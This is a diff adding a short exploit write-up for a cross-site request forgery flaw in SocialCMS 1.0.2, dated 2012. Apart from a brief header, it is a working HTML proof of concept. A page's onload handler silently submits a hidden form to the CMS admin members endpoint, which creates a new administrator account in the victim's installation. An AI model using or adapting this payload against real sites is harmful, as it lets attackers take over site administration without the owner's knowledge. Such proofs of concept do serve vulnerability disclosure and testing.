@@ -1,0 +1,25 @@
++-------------------------------------------------------------------------+
+# Exploit Title : Socialcms CSRF Vulnerability
+# Date          : 16-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Vendor site   : http://socialcms.com
+# Software link : http://sourceforge.net/projects/socialcms/files/latest/download
+# Version       : 1.0.2
+# Tested on     : Debian Squeeze (6.0) 
++-------------------------------------------------------------------------+
++---+[Add Admin Account by Ivano Binetti]---+
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>I'm adding ADMIN account using CSRF Vulnerability</H2>
+<form method="POST" name="form0" action="http://127.0.0.1:80//socialcms/my_admin/admin1_members.php?action=member_new&page=1&mID=1 ">
+<input type="hidden" name="TR_login_name" value="new_admin"/>
+<input type="hidden" name="TR_firstname" value="admin_user"/>
+<input type="hidden" name="TR_lastname" value="admin_user"/>
+<input type="hidden" name="TREF_email_address" value="admin@admin.com"/>
+<input type="hidden" name="TR_group_level" value="1"/>
+</form>
+</body>
+</html>
+
++----------------+
